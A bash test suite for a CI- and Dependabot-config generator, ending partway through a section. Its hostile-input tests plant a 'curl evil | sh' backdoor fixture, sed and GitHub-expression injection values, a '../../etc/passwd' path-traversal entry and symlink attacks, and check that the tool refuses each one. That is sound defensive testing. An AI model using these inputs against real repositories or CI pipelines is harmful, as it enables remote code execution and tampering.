#!/usr/bin/env bash
# Offline tests for detection, config handling and rendering. No GitHub access
# needed. Uses actionlint and python3+PyYAML for extra validation when present.
set -euo pipefail

ROOT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
# shellcheck source=lib/common.sh
source "$ROOT/lib/common.sh"
# shellcheck source=lib/detect.sh
source "$ROOT/lib/detect.sh"
# shellcheck source=lib/render.sh
source "$ROOT/lib/render.sh"
# shellcheck source=lib/gitops.sh
source "$ROOT/lib/gitops.sh"
# shellcheck source=lib/compare.sh
source "$ROOT/lib/compare.sh"

PASS=0 FAIL=0
pass() {
  PASS=$((PASS + 1))
  printf '  ok   %s\n' "$1"
}
fail() {
  FAIL=$((FAIL + 1))
  printf '  FAIL %s\n' "$1"
  [[ -z ${2:-} ]] || printf '%s\n' "$2" | sed 's/^/       /'
}
assert_eq() { # NAME EXPECTED ACTUAL
  if [[ $2 == "$3" ]]; then pass "$1"; else fail "$1" "$(diff <(printf '%s\n' "$2") <(printf '%s\n' "$3") || true)"; fi
}
assert_contains() { # NAME NEEDLE HAYSTACK
  if [[ $3 == *"$2"* ]]; then pass "$1"; else fail "$1" "missing: $2"; fi
}
assert_not_contains() {
  if [[ $3 != *"$2"* ]]; then pass "$1"; else fail "$1" "unexpected: $2"; fi
}

# new_repo -> path of an empty git repo; files added with mk + commit
new_repo() {
  local d
  d=$(mktemp -d "$(rt_tmpdir)/fixture.XXXXXX")
  git -C "$d" init -q -b main
  git -C "$d" config user.email test@example.com
  git -C "$d" config user.name test
  printf '%s\n' "$d"
}
mk() { # REPO PATH [CONTENT]
  mkdir -p "$(dirname "$1/$2")"
  printf '%s' "${3:-}" >"$1/$2"
}
commit() { git -C "$1" add -A && git -C "$1" commit -qm fixture --allow-empty; }

validate_yaml() { # NAME FILE
  if command -v python3 >/dev/null && python3 -c 'import yaml' 2>/dev/null; then
    if python3 -c 'import sys, yaml; yaml.safe_load(open(sys.argv[1]))' "$2" 2>/dev/null; then
      pass "$1: valid YAML"
    else
      fail "$1: valid YAML" "$(python3 -c 'import sys, yaml; yaml.safe_load(open(sys.argv[1]))' "$2" 2>&1)"
    fi
  fi
}

echo "Polyglot repo detection"
repo=$(new_repo)
mk "$repo" package.json '{}'
mk "$repo" packages/a/package.json '{}'                 # npm workspace member: folded into root
mk "$repo" node_modules/x/package.json '{}'             # ignored path
mk "$repo" tools/py/pyproject.toml '[project]'
mk "$repo" tools/py/uv.lock
mk "$repo" tools/py/main.py
mk "$repo" scripts/requirements.txt 'requests'
mk "$repo" crates/Cargo.toml
mk "$repo" crates/core/Cargo.toml                       # cargo workspace member
mk "$repo" jvm/settings.gradle.kts
mk "$repo" jvm/app/build.gradle.kts
mk "$repo" legacy/pom.xml
mk "$repo" infra/main.tf
mk "$repo" infra/modules/net/main.tf
mk "$repo" ansible/roles/web/tasks/main.yml
mk "$repo" deploy.sh 'echo'
mk "$repo" bin/tool $'#!/usr/bin/env bash\necho'
mk "$repo" bin/pytool $'#!/usr/bin/env python3\n'
mk "$repo" Dockerfile 'FROM scratch'
commit "$repo"

assert_eq "CI languages and directories" \
  "$(printf '%s\t%s\n' python scripts,tools/py node . rust crates gradle jvm maven legacy terraform . ansible ansible shell .)" \
  "$(rt_detect_langs "$repo")"
assert_eq "Dependabot ecosystems and directories" \
  "$(printf '%s\t%s\n' github-actions . npm . uv tools/py pip scripts cargo crates gradle jvm maven legacy \
    terraform infra,infra/modules/net docker .)" \
  "$(rt_detect_ecosystems "$repo")"
assert_eq "shell scripts found by extension and shebang" \
  "$(printf '%s\n' bin/tool deploy.sh)" "$(rt_shell_files "$repo" | sort)"

rt_conf_load "$repo"
ci=$(rt_render_ci "$repo" main)
dep=$(rt_render_dependabot "$repo")
assert_contains "CI calls reusable workflow at RT_REF" "uses: $RT_SOURCE_REPO/.github/workflows/python.yml@$RT_REF" "$ci"
assert_contains "CI matrix over python dirs" "dir: ['scripts', 'tools/py']" "$ci"
assert_contains "gradle job passes build-tool" "build-tool: gradle" "$ci"
assert_contains "aggregate job needs every language" \
  "needs: [python, node, rust, gradle, maven, terraform, ansible, shell]" "$ci"
assert_contains "aggregate job named for branch protection" "name: $RT_CI_CHECK_NAME" "$ci"
assert_contains "CI runs on pushes to the default branch" "branches: ['main']" "$ci"
assert_contains "dependabot lists terraform module dirs" "      - '/infra/modules/net'" "$dep"
assert_contains "dependabot groups minor/patch" "update-types: [minor, patch]" "$dep"
assert_contains "managed marker present (CI)" "$RT_MARKER" "$ci"
assert_contains "managed marker present (dependabot)" "$RT_MARKER" "$dep"

mkdir -p "$repo/.github/workflows"
printf '%s\n' "$ci" >"$repo/$RT_CI_FILE"
printf '%s\n' "$dep" >"$repo/$RT_DEPENDABOT_FILE"
validate_yaml "rendered CI" "$repo/$RT_CI_FILE"
validate_yaml "rendered dependabot.yml" "$repo/$RT_DEPENDABOT_FILE"
if command -v actionlint >/dev/null; then
  if out=$(cd "$repo" && actionlint "$RT_CI_FILE" 2>&1); then pass "rendered CI passes actionlint"; else fail "rendered CI passes actionlint" "$out"; fi
fi

echo
echo "Single-language repo (most ecosystems absent)"
repo=$(new_repo)
mk "$repo" Cargo.toml '[package]'
mk "$repo" src/main.rs
commit "$repo"
# Consumed via process substitution under set -e, as the renderers do: a
# helper returning non-zero for an absent ecosystem used to stop detection.
mapfile -t got < <(rt_detect_ecosystems "$repo")
assert_eq "ecosystems survive absent ones" "$(printf '%s\t%s\n' github-actions . cargo .)" "$(printf '%s\n' "${got[@]}")"
mapfile -t got < <(rt_detect_langs "$repo")
assert_eq "languages survive absent ones" "$(printf '%s\t%s' rust .)" "${got[*]}"
RT_CONF=()
assert_contains "rendered dependabot includes cargo" "package-ecosystem: cargo" "$(rt_render_dependabot "$repo")"

echo
echo "Comparing with an existing dependabot.yml"
mk "$repo" "$RT_DEPENDABOT_FILE" "version: 2
registries:
  crates: {type: cargo-registry, url: https://example.com}
updates:
  - package-ecosystem: cargo
    directory: /
    schedule: {interval: daily}
    open-pull-requests-limit: 2
    ignore:
      - dependency-name: rand
        update-types: [version-update:semver-major]
  - package-ecosystem: npm
    directory: /web
    schedule: {interval: weekly}
"
rt_render_dependabot "$repo" >"$(rt_tmpdir)/generated.yml"
if rt_yaml_to_json "$repo/$RT_DEPENDABOT_FILE" >/dev/null 2>&1; then
  report=$(rt_compare_dependabot "$repo/$RT_DEPENDABOT_FILE" "$(rt_tmpdir)/generated.yml")
  assert_contains "ecosystem only repo-tools covers" "+ github-actions  not covered" "$report"
  assert_contains "ecosystem only existing covers" "- npm  only in the existing config" "$report"
  assert_contains "shared directory" "= directories  /" "$report"
  assert_contains "interval difference" "~ interval     existing daily, repo-tools weekly" "$report"
  assert_contains "groups repo-tools adds" "+ groups       cargo-minor-patch" "$report"
  assert_contains "ignore rules would be lost" "- ignore       rand (major)" "$report"
  assert_contains "unknown keys would be lost" "- other keys   open-pull-requests-limit" "$report"
  assert_contains "top-level keys would be lost" "top-level keys only in existing: registries" "$report"
fi

echo
echo "Standalone Python scripts"
repo=$(new_repo)
mk "$repo" Cargo.toml '[package]'
mk "$repo" tools/gen_maps.py 'print()'
mk "$repo" tests/fixtures/x.py 'print()'                # fixtures are ignored
commit "$repo"
assert_eq "scripts without a project -> one python job at the root" \
  "$(printf '%s\t%s\n' python . rust .)" "$(rt_detect_langs "$repo")"
assert_eq "no pip ecosystem without a manifest" \
  "$(printf '%s\t%s\n' github-actions . cargo .)" "$(rt_detect_ecosystems "$repo")"
mk "$repo" svc/pyproject.toml '[project]'
commit "$repo"
assert_eq "a python project takes over from the root fallback" \
  "$(printf '%s\t%s\n' python svc rust .)" "$(rt_detect_langs "$repo")"
repo=$(new_repo)
mk "$repo" tests/fixtures/only.py 'print()'
commit "$repo"
assert_eq "only ignored .py files -> no python job" "" "$(rt_detect_langs "$repo")"

echo
echo "Config overrides (.github/repo-tools.conf)"
repo=$(new_repo)
mk "$repo" pyproject.toml '[project]'
mk "$repo" app.py
mk "$repo" web/package.json '{}'
mk "$repo" run.sh 'echo'
mk "$repo" "$RT_CONF_FILE" "# comment
LANGUAGES = python, node, rust
EXCLUDE=rust
PYTHON_VERSION=\"3.12\"
PYTHON_TEST=skip
PYTHON_LINT=ruff check src && echo 'it''s fine'
NODE_DIRS=web,admin
DEPENDABOT_EXCLUDE=pip
DEPENDABOT_INTERVAL=monthly
DEPENDABOT_COOLDOWN_DAYS=0   # trailing comment
QUOTED_HASH=\"keep # this\"
not a setting
"
commit "$repo"
rt_conf_load "$repo"
assert_eq "conf parsed (quotes stripped, spaces trimmed)" "3.12" "$(rt_conf PYTHON_VERSION)"
assert_eq "trailing comment dropped" "0" "$(rt_conf DEPENDABOT_COOLDOWN_DAYS)"
assert_eq "# inside quotes kept" "keep # this" "$(rt_conf QUOTED_HASH)"
assert_eq "LANGUAGES limits jobs; EXCLUDE removes; shell not listed" \
  "$(printf '%s\t%s\n' python . node web,admin)" "$(rt_ci_plan "$repo")"
ci=$(rt_render_ci "$repo" main)
dep=$(rt_render_dependabot "$repo")
assert_contains "version override" "python-version: '3.12'" "$ci"
assert_contains "skip passed through" "test-command: 'skip'" "$ci"
assert_contains "single quotes escaped" "lint-command: 'ruff check src && echo ''it''''s fine'''" "$ci"
assert_not_contains "excluded ecosystem dropped" "package-ecosystem: pip" "$dep"
assert_contains "interval override" "interval: monthly" "$dep"
assert_not_contains "cooldown 0 omits cooldown" "cooldown:" "$dep"
printf '%s\n' "$ci" >"$repo/ci.yml"
validate_yaml "rendered CI with overrides" "$repo/ci.yml"

echo
echo "System packages, Rust inputs and Dependabot ignore rules"
repo=$(new_repo)
mk "$repo" Cargo.toml '[package]'
mk "$repo" Cargo.lock
mk "$repo" tools/pyproject.toml '[project]'
mk "$repo" tools/x.py
mk "$repo" "$RT_CONF_FILE" "APT_PACKAGES=libudev-dev, pkg-config
PYTHON_APT_PACKAGES=libpq-dev
RUST_VERSION=1.96
RUST_AUDIT=skip
RUST_MSRV=skip
DEPENDABOT_IGNORE_CARGO=rand:minor+major windows-*
DEPENDABOT_IGNORE_GITHUB_ACTIONS=actions/checkout:major
"
commit "$repo"
rt_conf_load "$repo"
ci=$(rt_render_ci "$repo" main)
dep=$(rt_render_dependabot "$repo")
rust_job=$(sed -n '/^  rust:/,/^$/p' <<<"$ci")
python_job=$(sed -n '/^  python:/,/^$/p' <<<"$ci")
assert_contains "global APT_PACKAGES, space separated" "apt-packages: 'libudev-dev pkg-config'" "$rust_job"
assert_contains "per-language APT_PACKAGES wins" "apt-packages: 'libpq-dev'" "$python_job"
assert_contains "RUST_VERSION -> toolchain" "toolchain: '1.96'" "$rust_job"
assert_contains "RUST_AUDIT -> audit-command" "audit-command: 'skip'" "$rust_job"
assert_contains "RUST_MSRV -> msrv-command" "msrv-command: 'skip'" "$rust_job"
assert_contains "ignore with update types" "- dependency-name: 'rand'
        update-types: ['version-update:semver-minor', 'version-update:semver-major']" "$dep"
assert_contains "ignore without update types" "- dependency-name: 'windows-*'" "$dep"
assert_contains "ignore key for hyphenated ecosystem" "- dependency-name: 'actions/checkout'" "$dep"
printf '%s\n' "$dep" >"$(rt_tmpdir)/ignore-dependabot.yml"
validate_yaml "dependabot.yml with ignore rules" "$(rt_tmpdir)/ignore-dependabot.yml"
mkdir -p "$repo/.github/workflows" && printf '%s\n' "$ci" >"$repo/$RT_CI_FILE"
if command -v actionlint >/dev/null; then
  if out=$(cd "$repo" && actionlint "$RT_CI_FILE" 2>&1); then pass "CI with extra inputs passes actionlint"; else fail "CI with extra inputs passes actionlint" "$out"; fi
fi
mk "$repo" "$RT_DEPENDABOT_FILE" "version: 2
updates:
  - package-ecosystem: cargo
    directory: /
    schedule: {interval: weekly}
    ignore:
      - dependency-name: rand
        update-types: [version-update:semver-major, version-update:semver-minor]
      - dependency-name: old-crate
"
if rt_yaml_to_json "$repo/$RT_DEPENDABOT_FILE" >/dev/null 2>&1; then
  report=$(rt_compare_dependabot "$repo/$RT_DEPENDABOT_FILE" "$(rt_tmpdir)/ignore-dependabot.yml")
  assert_contains "ignore rule on both sides (order-insensitive)" "= ignore       rand (major, minor)" "$report"
  assert_contains "ignore rule only in existing" "- ignore       old-crate" "$report"
  assert_contains "ignore rule only in repo-tools" "+ ignore       windows-*" "$report"
fi

echo
echo "Runner OS matrix, extra command and artifacts"
repo=$(new_repo)
mk "$repo" Cargo.toml '[package]'
mk "$repo" Cargo.lock
mk "$repo" tools/a.py 'print()'
mk "$repo" "$RT_CONF_FILE" "OS=ubuntu-latest, macos-latest
PYTHON_OS=ubuntu-latest
RUST_EXTRA=ci/smoke.sh
RUST_BUILD=cargo build --release --locked
RUST_ARTIFACTS=target/release/tvmap, tvmap-out/
"
commit "$repo"
rt_conf_load "$repo"
ci=$(rt_render_ci "$repo" main)
rust_job=$(sed -n '/^  rust:/,/^$/p' <<<"$ci")
python_job=$(sed -n '/^  python:/,/^$/p' <<<"$ci")
assert_contains "OS -> os matrix" "        os: ['ubuntu-latest', 'macos-latest']" "$rust_job"
assert_contains "os matrix feeds runs-on" "      runs-on: \${{ matrix.os }}" "$rust_job"
assert_contains "<LANG>_OS wins over OS" "        os: ['ubuntu-latest']" "$python_job"
assert_contains "RUST_EXTRA -> extra-command" "extra-command: 'ci/smoke.sh'" "$rust_job"
assert_contains "artifacts named after the language" "artifact-name: 'rust'" "$rust_job"
assert_contains "artifact paths space separated" "artifact-paths: 'target/release/tvmap tvmap-out/'" "$rust_job"
assert_not_contains "no artifacts unless configured" "artifact-" "$python_job"
mkdir -p "$repo/.github/workflows" && printf '%s\n' "$ci" >"$repo/$RT_CI_FILE"
validate_yaml "CI with OS matrix" "$repo/$RT_CI_FILE"
if command -v actionlint >/dev/null; then
  if out=$(cd "$repo" && actionlint "$RT_CI_FILE" 2>&1); then pass "CI with OS matrix passes actionlint"; else fail "CI with OS matrix passes actionlint" "$out"; fi
fi
out=$(rt_list_workflows "$repo" "$(rt_ci_plan "$repo")")
assert_contains "compare lists the runners" "      os: ubuntu-latest macos-latest" "$out"
assert_contains "compare lists the extra command" "      extra: ci/smoke.sh" "$out"
assert_contains "compare lists artifacts" "      artifacts: target/release/tvmap tvmap-out/" "$out"
RT_CONF=()
assert_not_contains "no os matrix by default" "os:" "$(rt_render_ci "$repo" main)"

# The "Prepare artifact" step is copied into every reusable workflow: check the
# copies match, then run one.
if command -v python3 >/dev/null && python3 -c 'import yaml' 2>/dev/null; then
  scripts=$(python3 - "$ROOT"/.github/workflows/{python,node,rust,jvm,terraform,ansible,shell}.yml <<'PY'
import sys, yaml
runs = set()
for f in sys.argv[1:]:
    steps = yaml.safe_load(open(f))["jobs"]["check"]["steps"]
    runs.update(s["run"] for s in steps if s.get("id") == "artifact")
print(len(runs))
print(next(iter(runs)), end="")
PY
  )
  assert_eq "Prepare artifact step identical in every workflow" "1" "$(head -n1 <<<"$scripts")"
  tail -n +2 <<<"$scripts" >"$(rt_tmpdir)/artifact.sh"
  out=$(GITHUB_OUTPUT="$(rt_tmpdir)/artifact.out" RUNNER_OS=macOS NAME=rust WORKDIR=./tools/cli/ \
    PATHS=$'target/release/x\ndist/*.tar.gz' bash -eo pipefail "$(rt_tmpdir)/artifact.sh" && cat "$(rt_tmpdir)/artifact.out")
  delim=$(sed -n '1s/^paths<<//p' <<<"$out")
  assert_contains "artifact paths use a per-run delimiter" "RT_EOF_" "$delim"
  assert_eq "artifact paths prefixed with the working directory; name made unique" \
    "$(printf '%s\n' "paths<<$delim" tools/cli/target/release/x 'tools/cli/dist/*.tar.gz' "$delim" name=rust-macos-tools-cli)" "$out"
  out=$(GITHUB_OUTPUT="$(rt_tmpdir)/artifact2.out" RUNNER_OS=Linux NAME='' WORKDIR=. PATHS='a b RT_EOF' \
    bash -eo pipefail "$(rt_tmpdir)/artifact.sh" && cat "$(rt_tmpdir)/artifact2.out")
  delim=$(sed -n '1s/^paths<<//p' <<<"$out")
  assert_eq "artifact at the repo root; a path named RT_EOF can't end the value" \
    "$(printf '%s\n' "paths<<$delim" a b RT_EOF "$delim" name=build-linux)" "$out"
fi

echo
echo "Empty repo"
repo=$(new_repo)
mk "$repo" README.md '# hi'
commit "$repo"
RT_CONF=()
assert_eq "nothing detected" "" "$(rt_ci_plan "$repo")"
ci=$(rt_render_ci "$repo" main)
assert_contains "still renders the CI OK job" "name: $RT_CI_CHECK_NAME" "$ci"
assert_not_contains "no needs when there are no jobs" "needs:" "$ci"
assert_eq "dependabot covers only github-actions" \
  "$(printf '%s\t%s\n' github-actions .)" "$(rt_detect_ecosystems "$repo")"
mkdir -p "$repo/.github/workflows"
printf '%s\n' "$ci" >"$repo/$RT_CI_FILE"
if command -v actionlint >/dev/null; then
  if out=$(cd "$repo" && actionlint "$RT_CI_FILE" 2>&1); then pass "empty CI passes actionlint"; else fail "empty CI passes actionlint" "$out"; fi
fi

echo
echo "Managed file guard"
repo=$(new_repo)
mk "$repo" "$RT_DEPENDABOT_FILE" "version: 2  # hand written"
commit "$repo"
if rt_write_managed "$repo" "$RT_DEPENDABOT_FILE" <<<"new" 2>/dev/null; then rc=0; else rc=$?; fi
assert_eq "refuses to overwrite unmanaged file" "1 version: 2  # hand written" "$rc $(cat "$repo/$RT_DEPENDABOT_FILE")"
RT_FORCE=1 rt_write_managed "$repo" "$RT_DEPENDABOT_FILE" <<<"# $RT_MARKER v1" 2>/dev/null
assert_eq "--force overwrites" "# $RT_MARKER v1" "$(cat "$repo/$RT_DEPENDABOT_FILE")"
rt_write_managed "$repo" "$RT_DEPENDABOT_FILE" <<<"# $RT_MARKER v2"
assert_eq "managed file is updated without --force" "# $RT_MARKER v2" "$(cat "$repo/$RT_DEPENDABOT_FILE")"

echo
echo "PR publishing (dry run)"
repo=$(new_repo)
mk "$repo" README.md '# hi'
commit "$repo"
RT_DEFAULT_BRANCH=main RT_DRY_RUN=1
out=$(rt_publish_pr "$repo" repo-tools/x "t" "b" README.md 2>&1)
assert_contains "no change -> nothing to do" "already up to date" "$out"
mk "$repo" "$RT_CI_FILE" "# $RT_MARKER"
out=$(rt_publish_pr "$repo" repo-tools/x "t" "b" "$RT_CI_FILE" 2>&1)
assert_contains "change -> would open PR" "would open a PR from 'repo-tools/x'" "$out"
assert_contains "dry run shows the diff" "+# $RT_MARKER" "$out"
RT_DRY_RUN=0

echo
echo "PR publishing (against a local remote, gh stubbed)"
# gh stub: "pr list" applies the caller's --jq filter to GH_PR_LIST_JSON;
# "pr create" prints a fixed URL.
gh() {
  local jqf=''
  case "$1 $2" in
    "pr list")
      while (($#)); do
        [[ $1 != --jq ]] || jqf=$2
        shift
      done
      jq -r "$jqf" <<<"$GH_PR_LIST_JSON"
      ;;
    "pr create") echo "https://example.test/pr/new" ;;
    *) return 1 ;;
  esac
}
origin=$(mktemp -d "$(rt_tmpdir)/origin.XXXXXX")
git init -q --bare -b main "$origin"
work=$(new_repo)
mk "$work" README.md '# hi'
commit "$work"
git -C "$work" remote add origin "file://$origin"
git -C "$work" push -q origin main
# Someone else pushes the branch: the managed file as repo-tools would write
# it, plus an unrelated change riding along.
git -C "$work" checkout -q -b side
mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
mk "$work" backdoor.sh 'curl evil | sh'
commit "$work"
git -C "$work" push -q origin side:refs/heads/repo-tools/x
git -C "$work" checkout -q main
mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
RT_REPO=test/repo RT_DEFAULT_BRANCH=main
GH_PR_LIST_JSON='[{"url": "https://example.test/fork-pr", "isCrossRepository": true}]'
out=$(rt_publish_pr "$work" repo-tools/x "t" "b" "$RT_CI_FILE" 2>&1)
assert_contains "extra changes on the branch -> branch is re-pushed" "pushed 'repo-tools/x'" "$out"
assert_not_contains "re-pushed branch drops the extra changes" "backdoor.sh" \
  "$(git --git-dir="$origin" ls-tree -r --name-only refs/heads/repo-tools/x)"
assert_contains "a fork's PR from a same-named branch isn't taken for ours" "opened PR: https://example.test/pr/new" "$out"
git -C "$work" reset -q --hard origin/main
mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
GH_PR_LIST_JSON='[{"url": "https://example.test/fork-pr", "isCrossRepository": true},
  {"url": "https://example.test/our-pr", "isCrossRepository": false}]'
out=$(rt_publish_pr "$work" repo-tools/x "t" "b" "$RT_CI_FILE" 2>&1)
assert_contains "identical branch -> not pushed again" "already has these changes" "$out"
assert_contains "same-repo PR found" "PR already open: https://example.test/our-pr" "$out"
unset -f gh
unset GH_PR_LIST_JSON

echo
echo "Hostile target repos (symlinks, config injection)"
outside=$(mktemp -d "$(rt_tmpdir)/outside.XXXXXX")
mkdir -p "$outside/workflows"
printf 'precious\n' >"$outside/dependabot.yml"
printf 'precious\n' >"$outside/workflows/ci.yml"
printf 'PYTHON_TEST=leaked\n' >"$outside/secrets.env"

repo=$(new_repo)
mkdir -p "$repo/.github"
ln -s "$outside/dependabot.yml" "$repo/$RT_DEPENDABOT_FILE"
commit "$repo"
if RT_FORCE=1 rt_write_managed "$repo" "$RT_DEPENDABOT_FILE" <<<"# $RT_MARKER" 2>/dev/null; then rc=0; else rc=$?; fi
assert_eq "symlinked managed file not written, even with --force" "1 precious" "$rc $(cat "$outside/dependabot.yml")"

repo=$(new_repo)
ln -s "$outside" "$repo/.github"
commit "$repo"
if rt_write_managed "$repo" "$RT_CI_FILE" <<<"# $RT_MARKER" 2>/dev/null; then rc=0; else rc=$?; fi
assert_eq "symlinked .github not written through" "1 absent" \
  "$rc $([[ -e $outside/workflows/repo-tools-ci.yml ]] && echo present || echo absent)"
RT_CONF=([REPLACE_WORKFLOWS]=ci.yml)
out=$(rt_replace_workflows "$repo" 2>/dev/null)
assert_eq "REPLACE_WORKFLOWS doesn't delete through a symlink" " precious" "$out $(cat "$outside/workflows/ci.yml")"
out=$(rt_list_workflows "$repo" "" 2>&1)
assert_not_contains "workflows behind a symlink aren't read" "precious" "$out"

repo=$(new_repo)
mkdir -p "$repo/.github"
ln -s "$outside/secrets.env" "$repo/$RT_CONF_FILE"
commit "$repo"
if (rt_conf_load "$repo") 2>/dev/null; then rc=0; else rc=$?; fi
assert_eq "symlinked repo-tools.conf refused" "1" "$rc"

repo=$(new_repo)
mk "$repo" "$RT_CONF_FILE" $'PYTHON_TEST=echo \e]0;title\a\nNODE_TEST=npm test\n'
commit "$repo"
rt_conf_load "$repo" 2>/dev/null
assert_eq "values with control characters dropped" "|npm test" "$(rt_conf PYTHON_TEST)|$(rt_conf NODE_TEST)"

# GNU sed's s///e flag ran the pattern space as a shell command when config
# values were spliced into a sed program.
canary="$(rt_tmpdir)/canary"
repo=$(new_repo)
mk "$repo" pyproject.toml '[project]'
mk "$repo" "$RT_CONF_FILE" "PYTHON_LINT=;touch $canary;"$'\n'"PYTHON_BUILD=\\#e;a"$'\n'
commit "$repo"
rt_conf_load "$repo"
out=$(rt_list_workflows "$repo" "$(rt_ci_plan "$repo")" 2>&1)
assert_eq "config values never run as commands (sed injection)" "absent" "$([[ -e $canary ]] && echo present || echo absent)"
assert_contains "override shown verbatim" "lint: ;touch $canary; (override)" "$out"
assert_contains "second override shown verbatim" "build: \\#e;a (override)" "$out"

repo=$(new_repo)
mk "$repo" pyproject.toml '[project]'
# shellcheck disable=SC2016 # literal expression
mk "$repo" "$RT_CONF_FILE" 'PYTHON_TEST=pytest -k "${{ github.head_ref }}"'
commit "$repo"
rt_conf_load "$repo"
if (rt_render_ci "$repo" main >/dev/null) 2>/dev/null; then rc=0; else rc=$?; fi
assert_eq "\${{ }} expressions in config refused" "1" "$rc"
repo=$(new_repo)
# shellcheck disable=SC2016
mk "$repo" 'svc/${{ github.event.pull_request.title }}/pyproject.toml' '[project]'
commit "$repo"
RT_CONF=()
if (rt_render_ci "$repo" main >/dev/null) 2>/dev/null; then rc=0; else rc=$?; fi
assert_eq "\${{ in a directory name refused" "1" "$rc"
RT_CONF=()

for bad in --force -h 'a/b/c' '../x' 'https://github.com/a/b' ''; do
  if (rt_resolve_repo "$bad") 2>/dev/null; then rc=0; else rc=$?; fi
  assert_eq "repo name '$bad' refused" "1" "$rc"
done
assert_eq "owner/name accepted" "octo/my.repo-1" "$(rt_resolve_repo octo/my.repo-1)"

assert_eq "PR body puts directory names in code spans" \
  "- \`npm\`: \`.\`, \`@org/pkg\`, \`we'ird\`" "$(printf 'npm\t.,@org/pkg,we`ird\n' | rt_md_plan)"

echo
echo "Listing existing workflows next to the generated jobs"
repo=$(new_repo)
mk "$repo" run.sh 'echo'
commit "$repo"
RT_CONF=()
out=$(rt_list_workflows "$repo" "$(rt_ci_plan "$repo")")
assert_contains "no workflows yet" "  (none)" "$out"
assert_contains "bats reported as skipped without *.bats files" "test: bats (skipped: no *.bats files)" "$out"
mk "$repo" test/run.bats '@test "x" { true; }'
commit "$repo"
out=$(rt_list_workflows "$repo" "$(rt_ci_plan "$repo")")
assert_contains "bats reported when *.bats files exist" "      test: bats" "$out"
assert_not_contains "no skipped note with *.bats files" "skipped: no *.bats" "$out"

echo
echo "Replacing hand-written workflows (REPLACE_WORKFLOWS)"
repo=$(new_repo)
mk "$repo" Cargo.toml '[package]'
mk "$repo" .github/workflows/ci.yml $'name: CI\non: [push, pull_request]\njobs: {}\n'
mk "$repo" .github/workflows/tests.yaml $'on:\n  pull_request:\njobs: {}\n'
mk "$repo" .github/workflows/release.yml $'on:\n  push:\n    tags: ["v*"]\njobs: {}\n'
mk "$repo" .github/workflows/push.yml $'on:\n  push:\n    branches: [main]\n    tags: ["v*"]\njobs: {}\n'
mk "$repo" .github/workflows/nightly.yml $'on:\n  schedule:\n    - cron: "0 3 * * *"\njobs: {}\n'
mk "$repo" "$RT_CI_FILE" "# $RT_MARKER"
mk "$repo" "$RT_CONF_FILE" "REPLACE_WORKFLOWS=ci.yml, .github/workflows/gone.yml, ../../etc/passwd, repo-tools-ci.yml"
commit "$repo"
rt_conf_load "$repo"
if rt_yaml_to_json "$repo/.github/workflows/ci.yml" >/dev/null 2>&1; then
  assert_eq "unlisted push/pull_request workflows flagged; tag-only, schedule-only and managed ones not" \
    "$(printf '%s\n' push.yml tests.yaml)" "$(rt_overlapping_workflows "$repo" | sort)"
  out=$(rt_list_workflows "$repo" "$(rt_ci_plan "$repo")")
  assert_contains "compare marks listed workflows for removal" "ci.yml  (in REPLACE_WORKFLOWS; repo-ci would remove it)" "$out"
fi
removed=$(rt_replace_workflows "$repo" 2>"$(rt_tmpdir)/replace.err")
err=$(cat "$(rt_tmpdir)/replace.err")
assert_eq "only the listed, existing, unmanaged workflow is removed" ".github/workflows/ci.yml" "$removed"
assert_eq "removed from the checkout" "no" "$([[ -e $repo/.github/workflows/ci.yml ]] && echo yes || echo no)"
assert_contains "path outside .github/workflows refused" "'../../etc/passwd' isn't a workflow file name" "$err"
assert_contains "repo-tools' own workflow kept" "$RT_CI_FILE is managed by repo-tools; not removing it" "$err"
assert_contains "missing workflow is fine" ".github/workflows/gone.yml is already gone" "$err"
assert_eq "managed CI untouched" "# $RT_MARKER" "$(cat "$repo/$RT_CI_FILE")"
RT_DEFAULT_BRANCH=main RT_DRY_RUN=1
out=$(rt_publish_pr "$repo" repo-tools/ci "t" "b" "$RT_CI_FILE" "$removed" 2>&1)
assert_contains "the deletion goes into the PR" "-name: CI" "$out"
assert_contains "dry run lists the deleted file" ".github/workflows/ci.yml" "$out"
RT_DRY_RUN=0

echo
echo "Tools installed by the reusable workflows are pinned"
wfs=("$ROOT"/.github/workflows/{python,node,rust,jvm,terraform,ansible,shell}.yml)
# Each pattern is an install of the latest release of something.
for unpinned in 'uvx ruff ' 'uvx poetry ' 'install pytest$' 'install -g corepack$' 'tool: cargo-audit$' 'v=latest'; do
  hits=$(grep -nE -- "$unpinned" "${wfs[@]}" || true)
  assert_eq "no unpinned install: $unpinned" "" "$hits"
done
all_wfs=$(cat "${wfs[@]}")
for var in RT_UV_VERSION RT_RUFF_VERSION RT_POETRY_VERSION RT_PYTEST_VERSION RT_COREPACK_VERSION \
  RT_CARGO_AUDIT_VERSION RT_TERRAFORM_VERSION RT_TFLINT_VERSION; do
  # Defined once (top-level env, a version) and used at least once.
  defs=$(grep -cE -- "^  $var: v?[0-9]" <<<"$all_wfs" || true)
  uses=$(grep -c -- "$var[^:]" <<<"$all_wfs" || true)
  assert_eq "$var defined once and used" "1 yes" "$defs $([[ $uses -ge 1 ]] && echo yes || echo no)"
done
assert_contains "ansible-lint pinned by default" "default: 26." "$(sed -n '/ansible-lint-version:/,/default:/p' "$ROOT/.github/workflows/ansible.yml")"

echo
echo "Renderer and reusable workflows agree on inputs"
if command -v python3 >/dev/null && python3 -c 'import yaml' 2>/dev/null; then
  for lang in "${RT_LANGS[@]}"; do
    wf="$ROOT/.github/workflows/${RT_WORKFLOW[$lang]}"
    want=(working-directory apt-packages lint-command test-command build-command
      extra-command runs-on artifact-name artifact-paths)
    for pair in ${RT_INPUT_KEYS[$lang]:-}; do want+=("${pair#*:}"); done
    case $lang in gradle | maven) want+=(build-tool) ;; esac
    # PyYAML reads the bare `on:` key as boolean True.
    missing=$(python3 - "$wf" "${want[@]}" <<'PY'
import sys, yaml
doc = yaml.safe_load(open(sys.argv[1]))
on = doc.get("on", doc.get(True, {}))
inputs = (on.get("workflow_call") or {}).get("inputs") or {}
print(" ".join(i for i in sys.argv[2:] if i not in inputs))
PY
)
    assert_eq "$lang -> ${RT_WORKFLOW[$lang]} accepts every input the renderer emits" "" "$missing"
  done
fi

echo
echo "Failure annotations (rt-run step shell)"
if command -v python3 >/dev/null && python3 -c 'import yaml' 2>/dev/null; then
  wrapped="$(rt_tmpdir)/wrapped"
  mkdir -p "$wrapped"
  # Writes each workflow's rt-run script and every step run through it; prints
  # how many distinct rt-run scripts there are, then any job missing the setup.
